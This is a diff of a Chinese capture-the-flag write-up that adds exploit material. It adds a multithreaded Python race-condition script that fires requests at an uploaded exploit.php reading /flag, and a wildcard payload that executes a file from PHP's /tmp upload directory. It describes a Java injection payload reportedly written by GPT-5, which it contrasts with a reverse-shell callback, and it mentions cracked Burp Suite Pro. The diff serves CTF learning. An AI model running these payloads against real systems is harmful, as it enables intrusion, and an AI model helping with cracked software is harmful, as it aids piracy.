@@ -47,7 +47,7 @@ function validatePassword() {
 ## 01 第一章 神秘的手镯_revenge ✅
 
 > [!NOTE]
-> 星澜音忘记 `flag` 了。
+> 该题目的 `flag` 是随机的。
 <!---->
 > K 皇：咳咳…其实当年飞升后，为了防止你偷偷看我收藏的小秘密，我重新设置了一个密码放在 `wanyanzhou.txt` 里面了……但是我忘记密码是啥了，而且不小心把保存密码的文件删了……
 
@@ -115,7 +115,7 @@ if __name__ == "__main__":
         send_unseal_requests()
 ```
 
-这里不得不吐槽一下 Burp Suite Community 了😡免费版不能把用户不当人啊，我挂了一个小时 Intruder，环境的一个小时时限都完了，500 次包还没发完😄
+这里不得不吐槽一下 Burp Suite Community 了😡免费版不能把用户不当人啊，我挂了一个小时 Intruder，环境的一个小时时限都完了，500 次包还没发完😄总之发完包之后再手动粘贴一次就能拿到 `flag` 了。
 
 ## 02 第二章 初识金曦玄轨 ✅
 
@@ -477,7 +477,7 @@ PHP 存在这样的特性，若一个字符串以 `0e` 开头，则它会被解�
 > [!NOTE]
 > 该题目的 `flag` 是随机的。
 
-在「星域真名」中输入 `stellalyrin.top`，得到：
+在「星域真名」中输入 `stellalyrin.top`（星域来了🥵），得到：
 
 ```plain
 ;; communications error to 10.43.0.10#53: connection refused
@@ -736,9 +736,84 @@ system('printenv');
 ## 15 第十五章 归真关·竞时净魔 ✅
 
 > [!NOTE]
-> 星澜音又忘了 `flag` 了。
+> 该题目的 `flag` 是随机的。
 
-是一个诡异的条件竞争。使用 Intruder 连发 `exploit.php`，用 Python 脚本尝试在清除前解析即可。本题过于吃运气，星澜音开了 30 分钟才成功一次。这里感谢 Patricia Of End 先生倾情提供的 Burp Suite Professional 安装服务😭（不知道为啥星澜音死活不会用注册机）
+是一个诡异的条件竞争。使用 Intruder 连发一个执行 `cat /flag` 的 `exploit.php`，用 Python 脚本尝试在清除前解析即可。本题过于吃运气，星澜音开了 30 分钟才成功一次。这里感谢 Patricia Of End 先生倾情提供的 Burp Suite Professional 安装服务😭（不知道为啥星澜音死活不会用注册机）
+
+这道题做起来太坐牢了……赛后别人说自己挂一分钟就好了，为啥我挂了半个小时？我还用的多线程，我真得急了😡别搞，别搞啊😭下面给出一个可用的 Python 脚本。
+
+```python
+import requests
+import threading
+import time
+import os
+
+# --- 配置 ---
+TARGET_URL = "http://127.0.0.1:4997/uploads/exploit.php"
+THREAD_COUNT = 10  # 可以适当调高，比如 100-200，增加成功率
+OUTPUT_FILENAME = "success_output.html" # 保存成功响应的文件名
+# --- 配置结束 ---
+
+stop_event = threading.Event()
+
+def visit_url():
+    session = requests.Session()
+    while not stop_event.is_set():
+        try:
+            response = session.get(TARGET_URL, timeout=1)
+            
+            # 只要状态码是 200，就意味着我们赢了，即使响应内容里有 PHP 错误
+            if response.status_code == 200:
+                # 关键一步：立刻保存响应内容
+                with open(OUTPUT_FILENAME, "w", encoding="utf-8") as f:
+                    f.write(response.text)
+                
+                print("\n" + "="*50)
+                print(f"[*] 竞争成功！线程 {threading.get_ident()} 捕获到 200 OK 响应！")
+                print(f"[*] 响应内容已完整保存到: {OUTPUT_FILENAME}")
+                print("="*50 + "\n")
+                
+                stop_event.set()
+                
+        except requests.exceptions.RequestException:
+            pass
+
+def main():
+    if os.path.exists(OUTPUT_FILENAME):
+        os.remove(OUTPUT_FILENAME)
+
+    print(f"[*] 开始 V2 条件竞争攻击...")
+    print(f"[*] 目标: {TARGET_URL}")
+    print(f"[*] 线程数: {THREAD_COUNT}")
+    print(f"[*] 成功后输出将保存至: {OUTPUT_FILENAME}")
+    print("[*] 按下 Ctrl+C 停止程序。")
+    print("[*] 正在疯狂发送请求...")
+
+    threads = []
+    for i in range(THREAD_COUNT):
+        thread = threading.Thread(target=visit_url)
+        thread.daemon = True
+        threads.append(thread)
+        thread.start()
+        
+    try:
+        while not stop_event.is_set():
+            print(".", end="", flush=True)
+            time.sleep(0.5)
+    except KeyboardInterrupt:
+        print("\n[*] 用户手动停止程序。")
+        stop_event.set()
+
+    if os.path.exists(OUTPUT_FILENAME):
+        print(f"\n[*] 攻击结束。请检查 {OUTPUT_FILENAME} 文件，里面可能包含 flag！")
+    else:
+        print("\n[*] 攻击结束，但未捕获到成功响应。可以尝试增加线程数再试一次。")
+    
+    os._exit(0)
+
+if __name__ == "__main__":
+    main()
+```
 
 ## 16 第十六章 昆仑星途 ✅
 
@@ -1671,7 +1746,7 @@ cat /flag
 ----------123--
 ```
 
-这种攻击方式基于这样一种思想：30 个字符对于我们构造回显 `/flag` 的 `payload` 来说实在太少，因此我们可以考虑上传一个包含恶意命令的脚本文件，再构造一个无字母数字的执行代码去执行它，这样便可以绕过检测。
+这种攻击方式基于这样一种思想：30 个字符对于我们构造回显 `/flag` 的 `payload` 来说实在太少，因此我们可以考虑上传一个包含恶意命令的脚本文件，再构造一个无字母数字的执行代码去执行它，这样便可以绕过检测。这里的 `<?= ... ?>` 是 PHP 的短输出标签，等同于 `<?php echo ...; ?>`，亦恰好缩短了 payload 的长度。
 
 我们在 HTTP 请求体中构造了一个 `1.txt`，它的内容很简单：
 
@@ -1680,13 +1755,15 @@ cat /flag
 cat /flag
 ```
 
-尽管 PHP 代码中没有处理文件的逻辑，但 PHP 引擎为了处理这个 POST 请求，依然会将这个文件内容保存在一个临时目录 `/tmp` 中，并为它生成一个随机文件名，例如 `/tmp/phpdry1ce`。事已至此，那么我们如何访问这个随机文件名的文件呢？一个合理且正确的猜测是：通配符。
+尽管 PHP 代码中没有处理文件的逻辑，但 PHP 引擎为了处理这个 POST 请求，依然会将这个文件内容保存在一个临时目录 `/tmp` 中，并为它生成一个随机文件名，例如 `/tmp/phpdry1ce`，格式为 `php` 后跟六个随机的字母和数字。事已至此，文件能传上去了，但我们该如何访问这个随机文件名的文件呢？一个合理且正确的猜测是：通配符。
 
 ```plain
 . /???/????????[@-[]
 ```
 
-（这个以后补，反正就是通配符可以通配到我们传上去那个文件，然后运行就行。星澜音困很，想睡了）
+在 shell 中，`.` 是 `source` 命令的别名，用于在当前 shell 环境下执行一个脚本文件，无论这个脚本文件是什么扩展名。而 `/???/????????[@-[]` 则是巧妙的部分：`/` 是路径分隔符，`?` 在 shell 通配符中代表任意单个字符，而 `[@-[]` 是一个范围通配符：在 ASCII 码中，`@` 的后面是 `A`、`B` 一直到 `Z`，而 `[` 恰好又位于 `Z` 之后。也就是说，这个通配符会去匹配一个位于 `/???` 下的文件名长九个字符的文件；而为了进一步过滤，第九个字符被设置为匹配大写字母，虽说有点碰概率，但一旦命中则正确的概率提高了。
+
+一次不成功可以多试几次，总有一次会打印出 `flag` 来。
 
 ## 23 第二十三章 幻境迷心·皇陨星沉（大结局）✅
 
@@ -2024,9 +2101,12 @@ HashMap<Object, Object> internalMap = new HashMap<>();
 
 ## 附加挑战 ✅
 
-哈喽又是我，10 月 8 日补 writeup 的星澜音。有人可能会问为啥你不过几天再写？这么说吧，星澜音的国庆假高数作业完成度 10%😭想了想还是先把 writeup 写了吧。
+> [!NOTE]
+> 该题目的 `flag` 是随机的。
+<!---->
+> 哈喽又是我，10 月 8 日补 writeup 的星澜音。有人可能会问为啥你不过几天再写？这么说吧，星澜音的国庆假高数作业完成度 10%😭想了想还是先把 writeup 写了吧。
 
-其实不难，第二十三章看懂了这个就是显然的。我们直接给出 payload，用它来替换上面的 payload 中对应部分即可。
+其实不难，第二十三章看懂了的话，这个就是显然的。我们直接给出 payload，用它来替换上面的 payload 中对应部分即可。
 
 ```java
 String evilCode = "{\n"
@@ -2043,11 +2123,11 @@ String evilCode = "{\n"
         + "}";
 ```
 
-因为这个 Spring Boot 程序会响应对 `/dogs` 的 HTTP POST 请求，并将其解读为添加狗狗的操作，所以我们套一个双层炸弹，让特工狗先注入进去，就像第二十三章那样，不过不让它把东西给反弹机，而是让它再造一个狗狗出来。
+考虑到这个 Spring Boot 程序会响应对 `/dogs` 的 HTTP POST 请求，并将其解读为添加狗狗的操作，所以我们套一个双层炸弹，让特工狗先注入进去，就像第二十三章那样，不过不让它把东西给反弹机，而是让它再造一个狗狗出来。
 
 刚开始星澜音用了 `curl`，但是死活不行，突然一想，会不会远程环境没有 `curl`？🤔这下说得通了😄但是根据第二十三章的经验，`nc` 应该是有的吧，那就手动构造 HTTP POST 请求好了。
 
-这段 payload 是雾雨（GPT-5）写的，反正我写不出来😭雾雨做了一堆鲁棒性优化，不过我寻思其实普通的指令应该就能行，大不了注入不了再改，问题不大。不过雾雨还是聪明的😋雾雨大善人😭
+这段 payload 是雾雨（GPT-5）写的，反正我写不出来😭雾雨做了一堆鲁棒性优化😋雾雨大善人😭
 
 ## Moe 笑传之猜猜爆 ✅
 
